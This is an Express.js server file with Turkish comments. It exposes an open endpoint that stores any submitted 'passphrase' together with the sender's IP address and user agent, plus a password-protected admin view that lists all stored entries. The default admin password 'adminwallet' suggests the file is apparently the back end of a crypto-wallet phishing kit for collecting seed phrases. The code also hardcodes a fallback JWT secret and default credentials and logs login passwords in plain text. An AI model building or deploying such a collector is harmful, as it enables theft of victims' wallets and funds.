const express = require('express');
const path = require('path');
const jwt = require('jsonwebtoken');
const dotenv = require('dotenv');
const fs = require('fs').promises;
const db = require('./database');

dotenv.config();

// JWT Secret key kontrolü ve tanımlaması
const JWT_SECRET = process.env.JWT_SECRET || 'your_super_secret_key_123456789';
const DATA_FILE = path.join(__dirname, 'data.json');

// Veri kaydetme fonksiyonu
const saveData = async (data) => {
  try {
    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Veri kaydetme hatası:', error);
  }
};

// Veri okuma fonksiyonu
const readData = async () => {
  try {
    const data = await fs.readFile(DATA_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    // Dosya yoksa boş array döndür
    if (error.code === 'ENOENT') {
      return { passphrases: [] };
    }
    console.error('Veri okuma hatası:', error);
    return { passphrases: [] };
  }
};

const app = express();

// CORS ayarları
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// Login endpoint'i
app.post('/api/login', (req, res) => {
  try {
    const { username, password } = req.body;
    console.log('Login attempt:', { username, password });

    const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'adminwallet';

    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      const token = jwt.sign(
        { username }, 
        JWT_SECRET,
        { expiresIn: '24h' }
      );
      console.log('Login successful');
      res.json({ success: true, token });
    } else {
      console.log('Invalid credentials');
      res.status(401).json({ 
        success: false, 
        error: 'Geçersiz kullanıcı adı veya şifre' 
      });
    }
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Giriş işlemi sırasında bir hata oluştu' 
    });
  }
});

// Token doğrulama middleware
const authenticateToken = (req, res, next) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
      return res.status(401).json({ 
        success: false, 
        error: 'Token bulunamadı' 
      });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
      if (err) {
        return res.status(403).json({ 
          success: false, 
          error: 'Geçersiz token' 
        });
      }
      req.user = user;
      next();
    });
  } catch (error) {
    console.error('Auth error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Kimlik doğrulama hatası' 
    });
  }
};

// Passphrase kaydetme endpoint'i
app.post('/api/save-passphrase', async (req, res) => {
  const { passphrase } = req.body;
  
  if (!passphrase) {
    return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
  }

  try {
    const data = await readData();
    const newPassphrase = {
      id: Date.now(),
      passphrase,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      createdAt: new Date().toISOString()
    };

    data.passphrases.push(newPassphrase);
    await saveData(data);

    console.log('Passphrase kaydedildi:', newPassphrase.id);
    res.json({ success: true });
  } catch (error) {
    console.error('Kaydetme hatası:', error);
    res.status(500).json({ success: false, error: 'Kayıt hatası' });
  }
});

// Admin endpoint'i (korumalı)
app.get('/api/admin/passphrases', authenticateToken, async (req, res) => {
  try {
    const data = await readData();
    res.json({ 
      success: true, 
      data: data.passphrases.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    });
  } catch (error) {
    console.error('Veri alma hatası:', error);
    res.status(500).json({ success: false, error: 'Veriler alınamadı' });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});

// Genel hata yakalama
process.on('unhandledRejection', (error) => {
  console.error('Yakalanmamış Promise Reddi:', error);
}); 